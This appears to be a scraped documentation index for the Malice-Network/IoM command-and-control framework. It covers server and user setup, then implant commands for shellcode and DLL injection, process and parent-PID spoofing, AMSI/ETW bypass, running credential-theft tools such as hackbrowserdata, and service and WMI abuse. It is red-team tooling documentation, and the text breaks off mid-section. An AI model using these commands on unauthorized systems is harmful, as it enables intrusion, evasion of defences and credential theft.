<p>\u6267\u884c\u547d\u4ee4\u540e\uff0c\u5ba2\u6237\u7aef\u4f1a\u81ea\u52a8\u4f7f\u7528\u65b0\u7684\u5ba2\u6237\u914d\u7f6e\u6587\u4ef6\u4e0e\u670d\u52a1\u5668\u8fde\u63a5\uff0c\u5e76\u5c06\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u79fb\u52a8\u81f3\u5ba2\u6237\u7aef\u7684\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u5939 (Windows \u4e0b\u4e3a <code>C:\\Users\\user\\.config\\malice\\configs</code>, Linux \u4e3a <code>/home/[username]/.config/malice/configs</code>\uff0cMacOS  \u4e3a <code>/Users/[username]/.config/malice/configs</code>\uff09</p> <p>\u5ba2\u6237\u7aef\u767b\u5f55\u6210\u529f\u540e\u4f1a\u8f93\u51fa\u4ee5\u4e0b\u4fe1\u606f\uff1a</p> <p></p> <p>\u4e0b\u6b21\u767b\u5f55\u540e\uff0c\u5ba2\u6237\u7aef\u4f1a\u81ea\u52a8\u663e\u793a\u5728\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u5939\u4e0b\u6240\u6709\u7684\u7528\u6237\u914d\u7f6e\uff0c\u6839\u636e\u9700\u6c42\uff0c\u9009\u62e9\u5bf9\u5e94\u7684\u7528\u6237\u8fdb\u884c\u9009\u62e9\u3002</p> <pre><code>./iom\n</code></pre> <p></p> <p>\u6bcf\u4e2aclient\u4e0b\u62e5\u6709\u72ec\u7acb\u7684profile\u914d\u7f6e\uff0c\u6bcf\u6b21client\u542f\u52a8\u90fd\u4f1a\u8bfb\u53d6\u5bf9\u5e94\u7684\u7528\u6237\u914d\u7f6e\u3002\u5982\u679c\u5728\u591a\u7528\u6237\u60c5\u51b5\u4e0b\u9700\u8981\u8fdb\u884c\u79c1\u6709\u914d\u7f6e\uff0c\u53ef\u4ee5\u5728client\u7684\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u4e0b\u7684malice.yaml\u8fdb\u884c\u4fee\u6539\u3002</p> <pre><code>resources: \"\"                             \ntmp: \"\"\naliases: []                             # sliver aliases\u672c\u5730\u52a0\u8f7d\u5217\u8868\nextensions:[]                           # sliver extensions\u672c\u5730\u52a0\u8f7d\u5217\u8868\nmals: []                                # mals\u672c\u5730\u52a0\u8f7d\u5217\u8868\nsettings:\n  max_server_log_size: 10               # \u6bcf\u4e2asession\u5728iom\u4fdd\u5b58\u7684\u6700\u5927\u65e5\u5fd7\u4e2a\u6570\n  github_repo: \"\"                       # malefic\u7684\u4ed3\u5e93\u540d\n  github_owner: \"\"                      # github\u7528\u6237\u540d\n  github_token: \"\"                      # github\u7684token\n  github_workflow_file: generate.yaml   # workflow\u7684\u914d\u7f6e\u6587\u4ef6\u540d\uff08\u9ed8\u8ba4\u4e3agenerate.yaml\n</code></pre>"},{"location":"IoM/manual/manual/deploy/#rootrpc","title":"ROOTRPC","text":"<p><code>malice-network</code> \u5b9e\u9645\u4e0a\u8fd8\u5b58\u5728\u4e00\u4e2a\u9ad8\u6743\u9650\u7684\u7ba1\u7406\u7ec4\u4ef6. \u9700\u8981\u6839\u8bc1\u4e66\u914d\u7f6e\u624d\u53ef\u5b9e\u73b0. \u8fd9\u4e2a\u8bc1\u4e66\u4e0d\u4f1a\u751f\u6210<code>.auth</code>\u6587\u4ef6, \u76f4\u63a5\u4fdd\u5b58\u5728\u670d\u52a1\u7aef\u914d\u7f6e\u548c\u6570\u636e\u5e93\u4e2d.</p> <p>\u53ea\u5141\u8bb8\u5df2\u7ecf\u542f\u52a8\u4e86<code>malice-network</code>\u7684\u673a\u5668\u4e0a, \u7ee7\u7eed\u901a\u8fc7<code>malice-network user</code> \u6216 <code>malice-network listener</code> \u8fdb\u884c\u7528\u6237\u7ba1\u7406.</p>"},{"location":"IoM/manual/manual/deploy/#\u8ba4\u8bc1\u6587\u4ef6","title":"\u8ba4\u8bc1\u6587\u4ef6","text":"<p>Malice-Network \u5ba2\u6237\u7aef\u9700\u8981\u4f7f\u7528\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u624d\u80fd\u4e0e\u670d\u52a1\u7aef\u8fdb\u884c\u4ea4\u4e92\u3002\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u4e2d\u5305\u542b\u7531\u670d\u52a1\u7aef\u751f\u6210\u7684\u8bc1\u4e66\u4fe1\u606f\u3002\u6bcf\u6b21\u5ba2\u6237\u7aef\u5c1d\u8bd5\u8fde\u63a5\u670d\u52a1\u7aef\u65f6\uff0c\u670d\u52a1\u7aef\u90fd\u4f1a\u6821\u9a8c\u8be5\u8bc1\u4e66\u4fe1\u606f\uff0c\u4ee5\u786e\u4fdd\u7528\u6237\u7684\u5408\u6cd5\u6027\u3002\u8fd9\u4e00\u8fc7\u7a0b\u4fdd\u8bc1\u4e86\u53ea\u6709\u7ecf\u8fc7\u8ba4\u8bc1\u7684\u7528\u6237\u624d\u80fd\u8bbf\u95ee\u548c\u4f7f\u7528 Malice-Network \u670d\u52a1\uff0c\u4ece\u800c\u63d0\u5347\u4e86\u7cfb\u7edf\u7684\u5b89\u5168\u6027\u548c\u53ef\u9760\u6027\u3002</p> <p>\u6240\u6709\u7684\u8fdc\u7a0b rpc \u4ea4\u4e92\u90fd\u9700\u8981<code>auth</code>\u6587\u4ef6\u4f7f\u7528 mtls \u8ba4\u8bc1.</p> <pre><code>operator: listener # \u64cd\u4f5c\u8005\u540d\u5b57\nhost: 127.0.0.1    # server grpc ip\nport: 5004         # server grpc port\ntype: listener     # \u64cd\u4f5c\u8005\u7c7b\u578b, \u5982\u679c\u4e0d\u5339\u914d\u5219\u4f1a\u8ba4\u8bc1\u5931\u8d25, \u9ed8\u8ba4\u751f\u6210\u7684\u5373\u53ef\nca: |\n   ...\nprivate_key: |\n   ...\ncertificate: |\n   ...\n</code></pre>"},{"location":"IoM/manual/manual/deploy/#\u6dfb\u52a0-client","title":"\u6dfb\u52a0 client","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b, \u4f1a\u751f\u6210\u4e00\u4e2a<code>admin_[server_ip].auth</code>\u7684\u914d\u7f6e. \u5927\u90e8\u5206\u60c5\u51b5\u4e0b, \u4f7f\u7528\u8fd9\u4e2a auth \u5373\u53ef.</p> <p>\u76ee\u524d\u6240\u6709\u7528\u6237\u90fd\u662f\u5e73\u7ea7\u7684, \u4f46\u53ef\u4ee5\u5728\u670d\u52a1\u7aef\u6dfb\u52a0\u6216\u540a\u9500\u6307\u5b9a\u7528\u6237\u7684\u8bc1\u4e66\u5b9e\u73b0\u7b80\u5355\u7684\u7ba1\u7406</p> <p>\u5728\u786e\u4fdd Malice-Network \u670d\u52a1\u5668\u5df2\u7ecf\u8fd0\u884c\u540e\uff0c\u5728\u7ec8\u7aef\u8f93\u5165\u4ee5\u4e0b\u6307\u4ee4\uff1a</p> <pre><code>.\\malice-network user add [username]\n</code></pre> <p>\u6267\u884c\u547d\u4ee4\u6210\u529f\u540e\uff0c\u670d\u52a1\u7aef\u4f1a\u8f93\u51fa\u4ee5\u4e0b\u4fe1\u606f\u5e76\u5728\u6240\u5904\u6587\u4ef6\u5939\u4e0b\u751f\u6210\u5bf9\u5e94\u7528\u6237\u914d\u7f6e\u6587\u4ef6\uff1a</p> <p></p> <p>\u4e5f\u53ef\u4ee5\u5220\u9664\u7528\u6237, \u540a\u9500\u8bc1\u4e66, \u4f7f\u5176\u65e0\u6cd5\u767b\u5f55 server</p> <pre><code>.\\malice-network user del [username]\n</code></pre> <p>\u5217\u51fa\u6240\u6709\u53ef\u7528\u7684\u7528\u6237\u914d\u7f6e</p> <pre><code>.\\malice-network user list\n</code></pre>"},{"location":"IoM/manual/manual/deploy/#\u6dfb\u52a0-listener","title":"\u6dfb\u52a0 listener","text":"<p>\u5728\u786e\u4fdd Malice-Network \u670d\u52a1\u5668\u5df2\u7ecf\u8fd0\u884c\u540e\uff0c\u5728\u7ec8\u7aef\u8f93\u5165\u4ee5\u4e0b\u6307\u4ee4\uff1a</p> <pre><code>.\\malice-network listener add [listener_name]\n</code></pre> <p>\u6267\u884c\u547d\u4ee4\u6210\u529f\u540e\uff0c\u670d\u52a1\u7aef\u4f1a\u8f93\u51fa\u4ee5\u4e0b\u4fe1\u606f\u5e76\u5728\u6240\u5904\u6587\u4ef6\u5939\u4e0b\u751f\u6210\u5bf9\u5e94 auth \u914d\u7f6e\u6587\u4ef6\uff1a</p> <p>\u4e5f\u53ef\u4ee5\u5220\u9664\u7528\u6237, \u4f7f\u5176\u65e0\u6cd5\u767b\u5f55 server</p> <pre><code>.\\malice-network listener del [listener_name]\n</code></pre> <p>\u5217\u51fa\u6240\u6709\u53ef\u7528\u7684\u7528\u6237\u914d\u7f6e</p> <pre><code>.\\malice-network listener list\n</code></pre>"},{"location":"IoM/manual/manual/implant/","title":"implant usage","text":""},{"location":"IoM/manual/manual/implant/#implant","title":"implant","text":""},{"location":"IoM/manual/manual/implant/#info","title":"info","text":"<p>show session info</p> <p>Description</p> <p>Displays the specified session info.</p> <pre><code>info\n</code></pre>"},{"location":"IoM/manual/manual/implant/#init","title":"init","text":"<p>init session</p> <pre><code>init\n</code></pre>"},{"location":"IoM/manual/manual/implant/#ping","title":"ping","text":"<p>get bind implant response</p> <pre><code>ping\n</code></pre>"},{"location":"IoM/manual/manual/implant/#polling","title":"polling","text":"<p>polling task status</p> <pre><code>polling [flags]\n</code></pre> <p>Options</p> <pre><code>      --interval int   interval (default 1)\n</code></pre>"},{"location":"IoM/manual/manual/implant/#recover","title":"recover","text":"<p>recover session</p> <pre><code>recover\n</code></pre>"},{"location":"IoM/manual/manual/implant/#sleep","title":"sleep","text":"<p>change implant sleep config</p> <pre><code>sleep [expression] [flags]\n</code></pre> <p>Options</p> <pre><code>      --jitter float   jitter\n</code></pre>"},{"location":"IoM/manual/manual/implant/#suicide","title":"suicide","text":"<p>kill implant</p> <pre><code>suicide\n</code></pre>"},{"location":"IoM/manual/manual/implant/#switch","title":"switch","text":"<p>switch session</p> <p>Description</p> <p>Switch session to other pipeline connection</p> <pre><code>switch [pipeline name]\n</code></pre>"},{"location":"IoM/manual/manual/implant/#wait","title":"wait","text":"<p>wait for task to finish</p> <pre><code>wait\n</code></pre> <p>Examples</p> <p>Wait task content. <pre><code>wait 59\n</code></pre></p>"},{"location":"IoM/manual/manual/implant/#cancel_task","title":"cancel_task","text":"<p>Cancel a task by task_id</p> <pre><code>cancel_task [task_id]\n</code></pre> <p>Examples</p> <pre><code>cancel_task &lt;task_id&gt;\n</code></pre>"},{"location":"IoM/manual/manual/implant/#fetch_task","title":"fetch_task","text":"<p>Fetch the details of a task</p> <pre><code>fetch_task\n</code></pre>"},{"location":"IoM/manual/manual/implant/#files","title":"files","text":"<p>List all downloaded files.</p> <pre><code>files\n</code></pre>"},{"location":"IoM/manual/manual/implant/#list_task","title":"list_task","text":"<p>List all tasks</p> <pre><code>list_task\n</code></pre> <p>Examples</p> <pre><code>list_task\n</code></pre>"},{"location":"IoM/manual/manual/implant/#query_task","title":"query_task","text":"<p>Query a task by task_id</p> <pre><code>query_task [task_id]\n</code></pre> <p>Examples</p> <pre><code>query_task &lt;task_id&gt;\n</code></pre>"},{"location":"IoM/manual/manual/implant/#tasks","title":"tasks","text":"<p>List tasks</p> <p>Description</p> <p>List tasks</p> <pre><code>tasks\n</code></pre> <p>Options</p> <pre><code>  -a, --all   show all tasks\n</code></pre>"},{"location":"IoM/manual/manual/implant/#clear","title":"clear","text":"<p>Clear modules</p> <pre><code>clear\n</code></pre>"},{"location":"IoM/manual/manual/implant/#list_module","title":"list_module","text":"<p>List modules</p> <pre><code>list_module\n</code></pre>"},{"location":"IoM/manual/manual/implant/#load_module","title":"load_module","text":"<p>Load module</p> <pre><code>load_module [module_file] [flags]\n</code></pre> <p>Examples</p> <p>load module from malefic-modules before loading, you can list the current modules:  <pre><code>execute_addon,exec ...\n</code></pre> then you can load module <pre><code>load_module --path &lt;module_file.dll&gt;\n</code></pre> you can see more modules loaded by list_module <pre><code>execute_addon,clear,ps,powershell...\n</code></pre></p> <p>Options</p> <pre><code>      --3rd string        build 3rd-party modules\n      --artifact string   exist module artifact\n      --bundle string     bundle name\n      --modules string    modules list,eg: basic,extend\n      --path string       module path\n</code></pre>"},{"location":"IoM/manual/manual/implant/#refresh_module","title":"refresh_module","text":"<p>Refresh module</p> <pre><code>refresh_module\n</code></pre>"},{"location":"IoM/manual/manual/implant/#explorer","title":"explorer","text":"<p>file explorer</p> <pre><code>explorer\n</code></pre>"},{"location":"IoM/manual/manual/implant/#reg_explorer","title":"reg_explorer","text":"<p>registry explorer</p> <pre><code>reg_explorer\n</code></pre>"},{"location":"IoM/manual/manual/implant/#execute_addon","title":"execute_addon","text":"<p>Execute the loaded addon</p> <pre><code>execute_addon [flags]\n</code></pre> <p>Examples</p> <p>Execute the addon without \"-\" arguments <pre><code>execute_addon httpx 1.1.1.1\n</code></pre> execute the addon file with \"-\" arguments, you need add \"--\" before the arguments <pre><code>execute_addon gogo.exe -- -i 127.0.0.1 -p http\n</code></pre> if you specify the addon name, you need to use the alias name <pre><code>execute_addon gogo -- -i 127.0.0.1 -p http\n</code></pre></p> <p>Options</p> <pre><code>      --arch string      architecture x64,x86\n  -a, --argue string     spoofing process arguments, eg: notepad.exe \n  -b, --block_dll        block not microsoft dll injection\n      --delay uint32     delay before execution in milliseconds (default 1)\n      --etw              disable ETW\n  -p, --ppid uint32      spoofing parent processes, (0 means injection into ourselves)\n  -n, --process string   custom process path (default \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe\")\n  -q, --quiet            disable output\n  -t, --timeout uint32   timeout, in seconds (default 60)\n</code></pre>"},{"location":"IoM/manual/manual/implant/#list_addon","title":"list_addon","text":"<p>List all addons</p> <pre><code>list_addon [addon]\n</code></pre>"},{"location":"IoM/manual/manual/implant/#load_addon","title":"load_addon","text":"<p>Load an addon</p> <p></p> <p>Description</p> <p>Load an executable into the implant's memory for reuse</p> <pre><code>load_addon [flags]\n</code></pre> <p>Examples</p> <p>addon default name is filename, default module is selected based on the file extension <pre><code>load_addon gogo.exe\n</code></pre> assigns an alias name gogo to the addon, and the specified module is execute_exe <pre><code>load_addon gogo.exe -n gogo -m execute_exe\n</code></pre></p> <p>Options</p> <pre><code>  -m, --module string   module type\n  -n, --name string     addon name\n</code></pre>"},{"location":"IoM/manual/manual/implant/#execute","title":"execute","text":""},{"location":"IoM/manual/manual/implant/#bof","title":"bof","text":"<p>COFF Loader,  executes Bof (Windows Only)</p> <p>Description</p> <p>refactor from https://github.com/hakaioffsec/coffee ,fix a bundle bugs</p> <p>Arguments for the BOF can be passed after the -- delimiter. Each argument must be prefixed with the type of the argument followed by a colon (:). The following types are supported:</p> <ul> <li>str - A null-terminated string</li> <li>wstr - A wide null-terminated string</li> <li>int - A signed 32-bit integer</li> <li>short - A signed 16-bit integer</li> <li>bin - A base64-encoded binary blob</li> </ul> <pre><code>bof [bof]\n</code></pre> <p>Examples</p> <pre><code>bof dir.x64.o -- wstr:\"C:\\\\Windows\\\\System32\"\n</code></pre>"},{"location":"IoM/manual/manual/implant/#dllspawn","title":"dllspawn","text":"<p>DllSpawn the given DLL in the sacrifice process</p> <p>Description</p> <p>use a custom Headless PE loader to load DLL in the sacrificed process.</p> <pre><code>dllspawn [dll] [flags]\n</code></pre> <p>Examples</p> <pre><code>dllspawn example.dll\n</code></pre> <p>Options</p> <pre><code>      --arch string         architecture x64,x86\n  -a, --argue string        spoofing process arguments, eg: notepad.exe \n      --binPath string      custom process path\n  -b, --block_dll           block not microsoft dll injection\n      --delay uint32        delay before execution in milliseconds (default 1)\n  -e, --entrypoint string   custom entrypoint\n      --etw                 disable ETW\n  -p, --ppid uint32         spoofing parent processes, (0 means injection into ourselves)\n  -n, --process string      custom process path (default \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe\")\n  -q, --quiet               disable output\n  -t, --timeout uint32      timeout, in seconds (default 60)\n</code></pre>"},{"location":"IoM/manual/manual/implant/#execute_1","title":"execute","text":"<p>Execute commands</p> <p>Description</p> <p>Exec local executable file, without output</p> <pre><code>execute [cmdline]\n</code></pre> <p>Examples</p> <p>Execute the executable file without any '-' arguments. <pre><code>execute whoami\n</code></pre> execute the executable file with '-' arguments, you need add \"--\" before the arguments <pre><code>execute gogo.exe -- -i 127.0.0.1 -p http\n</code></pre></p>"},{"location":"IoM/manual/manual/implant/#execute_assembly","title":"execute_assembly","text":"<p>Loads and executes a .NET assembly in implant process (Windows Only)</p> <p>Description</p> <p>Load CLR assembly in sacrifice process (with donut)</p> <pre><code>execute_assembly [file] [flags]\n</code></pre> <p>Examples</p> <pre><code>execute-assembly potato.exe \"whoami\" \n</code></pre> <p>Options</p> <pre><code>      --amsi           bypass AMSI\n  -a, --argue string   spoofing process arguments, eg: notepad.exe \n  -b, --block_dll      block not microsoft dll injection\n      --bypass-all     bypass AMSI,ETW,WLDP\n      --etw            disable ETW\n  -p, --ppid uint32    spoofing parent processes, (0 means injection into ourselves)\n      --wldp           bypass WLDP\n</code></pre>"},{"location":"IoM/manual/manual/implant/#execute_dll","title":"execute_dll","text":"<p>Executes the given DLL in the sacrifice process</p> <p>Description</p> <p>use a custom Headless PE loader to load DLL in the sacrificed process.</p> <pre><code>execute_dll [dll] [flags]\n</code></pre> <p>Examples</p> <pre><code>execute_dll example.dll \n</code></pre> <p>if entrypoint not default, you can specify the entrypoint</p> <pre><code>execute_dll example.dll -e entrypoint -- arg1 arg2\n</code></pre> <p>Options</p> <pre><code>      --arch string         architecture x64,x86\n  -a, --argue string        spoofing process arguments, eg: notepad.exe \n      --binPath string      custom process path\n  -b, --block_dll           block not microsoft dll injection\n      --delay uint32        delay before execution in milliseconds (default 1)\n  -e, --entrypoint string   custom entrypoint\n      --etw                 disable ETW\n  -p, --ppid uint32         spoofing parent processes, (0 means injection into ourselves)\n  -n, --process string      custom process path (default \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe\")\n  -q, --quiet               disable output\n  -t, --timeout uint32      timeout, in seconds (default 60)\n</code></pre>"},{"location":"IoM/manual/manual/implant/#execute_exe","title":"execute_exe","text":"<p>Executes the given PE in the sacrifice process</p> <p></p> <p>Description</p> <p>use a custom Headless PE loader to load EXE in the sacrificed process.</p> <pre><code>execute_exe [exe] [flags]\n</code></pre> <p>Examples</p> <pre><code>execute_exe gogo.exe -- -i 123.123.123.123 -p top2\n</code></pre> <p>Options</p> <pre><code>      --arch string      architecture x64,x86\n  -a, --argue string     spoofing process arguments, eg: notepad.exe \n  -b, --block_dll        block not microsoft dll injection\n      --delay uint32     delay before execution in milliseconds (default 1)\n      --etw              disable ETW\n  -p, --ppid uint32      spoofing parent processes, (0 means injection into ourselves)\n  -n, --process string   custom process path (default \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe\")\n  -q, --quiet            disable output\n  -t, --timeout uint32   timeout, in seconds (default 60)\n</code></pre>"},{"location":"IoM/manual/manual/implant/#execute_local","title":"execute_local","text":"<p>Execute local PE on sacrifice process</p> <p>Description</p> <p>Execute local PE on sacrifice process, support spoofing process arguments, spoofing ppid, block-dll, disable etw</p> <pre><code>execute_local [local_exe] [flags]\n</code></pre> <p>Examples</p> <pre><code>execute_local local_exe --ppid 1234 --block_dll --etw --argue \"argue\"\n</code></pre> <p>Options</p> <pre><code>  -a, --argue string     spoofing process arguments, eg: notepad.exe \n  -b, --block_dll        block not microsoft dll injection\n      --etw              disable ETW\n  -o, --output           disable output\n  -p, --ppid uint32      spoofing parent processes, (0 means injection into ourselves)\n  -n, --process string   custom process path\n</code></pre>"},{"location":"IoM/manual/manual/implant/#execute_shellcode","title":"execute_shellcode","text":"<p>Executes the given shellcode in the sacrifice process</p> <p>Description</p> <p>The current shellcode injection method uses APC.</p> <p>In the future, configurable shellcode injection settings will be provided, along with Donut, SGN, SRDI, etc.</p> <pre><code>execute_shellcode [shellcode_file] [flags]\n</code></pre> <p>Examples</p> <pre><code>execute_shellcode example.bin\n</code></pre> <p>Options</p> <pre><code>      --arch string      architecture x64,x86\n  -a, --argue string     spoofing process arguments, eg: notepad.exe \n  -b, --block_dll        block not microsoft dll injection\n      --delay uint32     delay before execution in milliseconds (default 1)\n      --etw              disable ETW\n  -p, --ppid uint32      spoofing parent processes, (0 means injection into ourselves)\n  -n, --process string   custom process path (default \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe\")\n  -q, --quiet            disable output\n  -t, --timeout uint32   timeout, in seconds (default 60)\n</code></pre>"},{"location":"IoM/manual/manual/implant/#inline_assembly","title":"inline_assembly","text":"<p>Loads and inline execute a .NET assembly (Windows Only)</p> <p>Description</p> <p>Load CLR assembly in implant process(will not create new process)</p> <p>if return 0x80004005, please use --amsi bypass.</p> <pre><code>inline_assembly [file] [flags]\n</code></pre> <p>Examples</p> <p>inline execute a .NET assembly <pre><code>inline-assembly --amsi potato.exe \"whoami\" \n</code></pre> Execute a .NET assembly with \"-\" arguments, you need add \"--\" before the arguments <pre><code>inline-assembly --amsi potato.exe -- cmd /c whoami\n</code></pre></p> <p>Options</p> <pre><code>      --amsi         bypass AMSI\n      --bypass-all   bypass AMSI,ETW,WLDP\n      --etw          bypass ETW\n      --wldp         bypass WLDP\n</code></pre>"},{"location":"IoM/manual/manual/implant/#inline_dll","title":"inline_dll","text":"<p>Executes the given inline DLL in the current process</p> <p>Description</p> <p>use a custom Headless PE loader to load DLL in the current process.</p> <p>\"instability warning!!!</p> <p>inline execute dll may cause the implant to crash, please use with caution.</p> <pre><code>inline_dll [dll] [flags]\n</code></pre> <p>Examples</p> <p>execute an inline DLL with the default entry point <pre><code>inline_dll example.dll\n</code></pre> specify the entrypoint <pre><code>inline_dll example.dll -e RunFunction -- arg1 arg2\n</code></pre></p> <p>Options</p> <pre><code>      --arch string         architecture x64,x86\n      --delay uint32        delay before execution in milliseconds (default 1)\n  -e, --entrypoint string   entrypoint\n  -n, --process string      custom process path (default \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe\")\n  -q, --quiet               disable output\n  -t, --timeout uint32      timeout, in seconds (default 60)\n</code></pre>"},{"location":"IoM/manual/manual/implant/#inline_exe","title":"inline_exe","text":"<p>Executes the given inline EXE in current process</p> <p>Description</p> <p>use a custom Headless PE loader to load EXE in the current process.</p> <p>\"instability warning!!!</p> <p>inline execute exe may cause the implant to crash, please use with caution.</p> <p>if double run same exe, More likely to crash</p> <pre><code>inline_exe [exe] [flags]\n</code></pre> <p>Examples</p> <p>execute the inline PE file <pre><code>inline_exe hackbrowserdata.exe -- -h\n</code></pre></p> <p>Options</p> <pre><code>      --arch string      architecture x64,x86\n      --delay uint32     delay before execution in milliseconds (default 1)\n  -n, --process string   custom process path (default \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe\")\n  -q, --quiet            disable output\n  -t, --timeout uint32   timeout, in seconds (default 60)\n</code></pre>"},{"location":"IoM/manual/manual/implant/#inline_local","title":"inline_local","text":"<p>Execute inline PE on implant process</p> <p>Description</p> <p>Execute inline PE on implant process, support spoofing process arguments</p> <pre><code>inline_local [local_exe] [flags]\n</code></pre> <p>Examples</p> <pre><code>inline_local whoami\n</code></pre> <p>Options</p> <pre><code>  -a, --argue string     spoofing process arguments, eg: notepad.exe \n  -b, --block_dll        block not microsoft dll injection\n      --etw              disable ETW\n  -o, --output           disable output\n  -p, --ppid uint32      spoofing parent processes, (0 means injection into ourselves)\n  -n, --process string   custom process path\n</code></pre>"},{"location":"IoM/manual/manual/implant/#inline_shellcode","title":"inline_shellcode","text":"<p>Executes the given inline shellcode in the implant process</p> <p>Description</p> <p>The current shellcode injection method uses APC.</p> <p>\"instability warning!!!</p> <p>inline execute shellcode may cause the implant to crash, please use with caution.</p> <pre><code>inline_shellcode [shellcode_file] [flags]\n</code></pre> <p>Examples</p> <pre><code>inline_shellcode example.bin\n</code></pre> <p>Options</p> <pre><code>      --arch string      architecture x64,x86\n      --delay uint32     delay before execution in milliseconds (default 1)\n  -n, --process string   custom process path (default \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe\")\n  -q, --quiet            disable output\n  -t, --timeout uint32   timeout, in seconds (default 60)\n</code></pre>"},{"location":"IoM/manual/manual/implant/#powerpick","title":"powerpick","text":"<p>unmanaged powershell on implant process (Windows Only)</p> <pre><code>powerpick [args] [flags]\n</code></pre> <p>Examples</p> <pre><code>powerpick -s powerview.ps1 -- Get-NetUser\n</code></pre> <p>Options</p> <pre><code>      --amsi            bypass AMSI\n      --bypass-all      bypass AMSI,ETW,WLDP\n      --etw             bypass ETW\n  -s, --script string   powershell script\n      --wldp            bypass WLDP\n</code></pre>"},{"location":"IoM/manual/manual/implant/#powershell","title":"powershell","text":"<p>Execute cmd with powershell</p> <p>Description</p> <p>equal: powershell.exe -ExecutionPolicy Bypass -w hidden -nop \"[cmdline]\"</p> <pre><code>powershell [cmdline] [flags]\n</code></pre> <p>Examples</p> <p>execute powershell command: <pre><code>powershell dir\n</code></pre></p> <p>Options</p> <pre><code>  -q, --quiet   disable output\n</code></pre>"},{"location":"IoM/manual/manual/implant/#run","title":"run","text":"<p>run commands</p> <p>Description</p> <p>Exec local executable file, return output</p> <pre><code>run [cmdline]\n</code></pre> <p>Examples</p> <p>Execute the executable file without any '-' arguments. <pre><code>run whoami\n</code></pre> run the executable file with '-' arguments, you need add \"--\" before the arguments <pre><code>run gogo.exe -- -i 127.0.0.1 -p http\n</code></pre></p>"},{"location":"IoM/manual/manual/implant/#shell","title":"shell","text":"<p>Execute cmd</p> <p>Description</p> <p>equal: exec cmd /c \"[cmdline]\"</p> <pre><code>shell [cmdline] [flags]\n</code></pre> <p>Options</p> <pre><code>  -q, --quiet   disable output\n</code></pre>"},{"location":"IoM/manual/manual/implant/#sys","title":"sys","text":""},{"location":"IoM/manual/manual/implant/#bypass","title":"bypass","text":"<p>Bypass AMSI and ETW</p> <pre><code>bypass [flags]\n</code></pre> <p>Examples</p> <pre><code>bypass --amsi --etw\n</code></pre> <p>Options</p> <pre><code>      --amsi   Bypass AMSI\n      --etw    Bypass ETW\n</code></pre>"},{"location":"IoM/manual/manual/implant/#env","title":"env","text":"<p>List environment variables</p> <pre><code>env\n</code></pre> <p>SEE ALSO</p> <ul> <li>env set    - Set environment variable</li> <li>env unset    - Unset environment variable</li> </ul>"},{"location":"IoM/manual/manual/implant/#env-set","title":"env set","text":"<p>Set environment variable</p> <pre><code>env set [env-key] [env-value]\n</code></pre> <p>Examples</p> <p><pre><code>    setenv key1 value1\n    ~~~\n\n**SEE ALSO**\n\n* [env](#env)    - List environment variables\n\n#### env unset\nUnset environment variable\n\n```\nenv unset [env-key]\n```\n\n**Examples**\n</code></pre>     unsetenv key1     ~~~</p> <p>SEE ALSO</p> <ul> <li>env    - List environment variables</li> </ul>"},{"location":"IoM/manual/manual/implant/#kill","title":"kill","text":"<p>Kill the process by pid</p> <pre><code>kill [pid]\n</code></pre> <p>Examples</p> <p>kill the process which pid is 1234 <pre><code>kill 1234\n</code></pre></p>"},{"location":"IoM/manual/manual/implant/#netstat","title":"netstat","text":"<p>List network connections</p> <pre><code>netstat\n</code></pre>"},{"location":"IoM/manual/manual/implant/#ps","title":"ps","text":"<p>List processes</p> <pre><code>ps\n</code></pre>"},{"location":"IoM/manual/manual/implant/#sysinfo","title":"sysinfo","text":"<p>Get basic sys info</p> <pre><code>sysinfo\n</code></pre>"},{"location":"IoM/manual/manual/implant/#whoami","title":"whoami","text":"<p>Print current user</p> <pre><code>whoami\n</code></pre>"},{"location":"IoM/manual/manual/implant/#wmi_execute","title":"wmi_execute","text":"<p>Execute a WMI method</p> <p>Description</p> <p>Executes a specified method within a WMI class, allowing for more complex administrative actions via WMI.</p> <pre><code>wmi_execute [flags]\n</code></pre> <p>Examples</p> <p>Execute a WMI method: <pre><code>wmi_execute --namespace &lt;namespace&gt; --class_name &lt;classname&gt; --method_name &lt;method_name&gt; --params &lt;key1&gt;=&lt;value1&gt;,&lt;key2&gt;=&lt;value2&gt;\n  ~~~\nExecute a WMI method to create a new process:\n</code></pre> wmi_execute --namespace root\\cimv2 --class_name Win32_Process --method_name Create --params CommandLine=\"notepad.exe\" <pre><code>**Options**\n\n```\n      --class_name string    WMI class name\n      --method_name string   WMI method name\n      --namespace string     WMI namespace (e.g., root\\cimv2)\n      --params strings       Parameters for the WMI method\n```\n\n### wmi_query\nPerform a WMI query\n\n**Description**\n\nExecutes a WMI query within the specified namespace to retrieve system information or perform administrative actions.\n\n```\nwmi_query [flags]\n```\n\n**Examples**\n\nPerform a WMI query in the root\\\\cimv2 namespace:\n  ~~~\n  wmi_query --namespace root\\\\cimv2 --args \"SELECT * FROM Win32_Process\"\n  ~~~\n\n**Options**\n\n```\n      --args strings       Arguments for the WMI query\n      --namespace string   WMI namespace (e.g., root\\cimv2)\n```\n\n### service\nPerform service operations\n\n**Description**\n\nManage services, including listing, creating, starting, stopping, and querying service status.\n\n**SEE ALSO**\n\n* [service create](#service-create)  - Create a new service\n* [service delete](#service-delete)  - Delete a specified service\n* [service list](#service-list)  - List all available services\n* [service query](#service-query)    - Query the status of a service\n* [service start](#service-start)    - Start an existing service\n* [service stop](#service-stop)  - Stop a running service\n\n#### service create\nCreate a new service\n\n**Description**\n\nCreate a new service with specified name, display name, executable path, start type, error control, and account name.\n\nControl the start type and error control by providing appropriate values.\n\n```\nservice create [flags]\n```\n\n**Examples**\n\nCreate a new service named \"example_service\":\n  ~~~\n  service create --name example_service --display \"Example Service\" --path /path/to/executable --start_type AutoStart --error Normal\n  ~~~\n\n**Options**\n\n```\n      --account string      AccountName for service 